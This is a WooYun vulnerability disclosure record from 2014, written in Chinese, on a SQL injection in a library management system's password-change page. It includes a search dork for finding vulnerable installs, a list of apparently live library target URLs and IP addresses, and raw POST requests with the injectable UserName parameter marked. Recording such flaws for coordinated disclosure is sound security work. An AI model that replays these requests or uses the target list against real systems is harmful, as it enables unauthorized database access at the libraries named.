{"id": 42269, "wybug_id": "wooyun-2014-086278", "wybug_title": "某图书馆管理系统存在通用型SQL注入漏洞", "wybug_corp": "深圳市科图自动化新技术应用公司", "wybug_author": "路人甲", "wybug_date": "2014-12-07 19:20", "wybug_open_date": "2015-03-07 19:22", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "17", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-07：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-12-12：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-12-15：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-02-05：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-02-15：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-02-25：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-03-07：\t细节向公众公开  简要描述： ... 详细说明：  以为是首发，结果在平台搜索了一下，竟然存在 WooYun: 某图书馆自动化集成系统注入导致可写shell 这里注入的点与上面的不同。---------------------------------搜索： inurl:NTRdrLogin.aspx漏洞页面：ModifyPassWord.aspx（修改密码处）漏洞参数：UserName\n收集的部分案例：http://124.133.52.135/ModifyPassWord.aspxhttp://opac.jxlib.gov.cn/ModifyPassWord.aspxhttp://opac.its.csu.edu.cn/ModifyPassWord.aspxhttp://ilas.pxlib.cn/ModifyPassWord.aspxhttp://218.28.6.78/ModifyPassWord.aspxhttp://218.195.101.103/ModifyPassWord.aspxhttp://ilas.ynlib.cn/ModifyPassWord.aspxhttp://opac.whsw.cn/ModifyPassWord.aspxhttp://218.195.112.99/ModifyPassWord.aspxhttp://202.96.165.98/ModifyPassWord.aspxhttp://124.133.52.135/ModifyPassWord.aspxhttp://210.34.212.78/ModifyPassWord.aspxhttp://my.zslib.cn/ModifyPassWord.aspxhttp://211.69.140.40/ModifyPassWord.aspxhttp://218.64.118.42:88/ModifyPassWord.aspxhttp://182.135.65.151:9999/ModifyPassWord.aspx\n漏洞证明：1# http://182.135.65.151:9999/ModifyPassWord.aspx\nPOST /ModifyPassWord.aspx HTTP/1.1Host: 182.135.65.151:9999Proxy-Connection: keep-aliveContent-Length: 225Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://182.135.65.151:9999User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.131 Safari/537.36Content-Type: application/x-www-form-urlencodedReferer: http://182.135.65.151:9999/ModifyPassWord.aspxAccept-Encoding: gzip,deflate,sdchAccept-Language: zh-CN,zh;q=0.8,en;q=0.6,fr;q=0.4,ja;q=0.2,ko;q=0.2,ru;q=0.2,vi;q=0.2,zh-TW;q=0.2,es;q=0.2,th;q=0.2__VIEWSTATE=%2FwEPDwULLTE5MzA2NTg3MThkZO33P%2Bh3EKvyu8kpaoeLykwc8GOf&UserName=*&TBEmail=test%40test.com&BtnLogin=%E7%A1%AE++%E5%AE%9A&__EVENTVALIDATION=%2FwEWBAKO7fn4BgKvruq2CALsr7KBDwLi44eGDKh0GCz39%2BF3vSmD7VSvwy%2FEZs5h\n\n\n2# http://211.69.140.40//ModifyPassWord.aspx\nPOST /ModifyPassWord.aspx HTTP/1.1Host: 211.69.140.40Proxy-Connection: keep-aliveContent-Length: 222Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://211.69.140.40User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.131 Safari/537.36Content-Type: application/x-www-form-urlencodedReferer: http://211.69.140.40/ModifyPassWord.aspxAccept-Encoding: gzip,deflate,sdchAccept-Language: zh-CN,zh;q=0.8,en;q=0.6,fr;q=0.4,ja;q=0.2,ko;q=0.2,ru;q=0.2,vi;q=0.2,zh-TW;q=0.2,es;q=0.2,th;q=0.2__VIEWSTATE=%2FwEPDwULLTE5MzA2NTg3MThkZA0nM17Ps86NxFrKOTKh64BzCeD6&UserName=*&TBEmail=test%40test.com&BtnLogin=%E7%A1%AE++%E5%AE%9A&__EVENTVALIDATION=%2FwEWBALWkpYFAq%2Bu6rYIAuyvsoEPAuLjh4YM7GLoUlzmifZJZMX%2BSz8mXRc56Zk%3D\n\n\n3# http://my.zslib.cn/ModifyPassWord.aspx\nPOST /ModifyPassWord.aspx HTTP/1.1Host: my.zslib.cnProxy-Connection: keep-aliveContent-Length: 220Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://my.zslib.cnUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.131 Safari/537.36Content-Type: application/x-www-form-urlencodedReferer: http://my.zslib.cn/ModifyPassWord.aspxAccept-Encoding: gzip,deflate,sdchAccept-Language: zh-CN,zh;q=0.8,en;q=0.6,fr;q=0.4,ja;q=0.2,ko;q=0.2,ru;q=0.2,vi;q=0.2,zh-TW;q=0.2,es;q=0.2,th;q=0.2__VIEWSTATE=%2FwEPDwULLTE5MzA2NTg3MThkZFfkXLchxneNN4wSpE5v6%2Fkh8Lrg&UserName=1&TBEmail=test%40test.com&BtnLogin=%E7%A1%AE++%E5%AE%9A&__EVENTVALIDATION=%2FwEWBALi7J%2BqDAKvruq2CALsr7KBDwLi44eGDCglaWf1GyuTLWI5zvNYuVjqC04y\n\n\n4# 更多的就不证明了…   漏洞证明：  ↑↑↑   修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2014-12-12 08:48 厂商回复： CNVD确认并复现所述情况，暂未建立与软件生产厂商的直接处置渠道，待认领。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}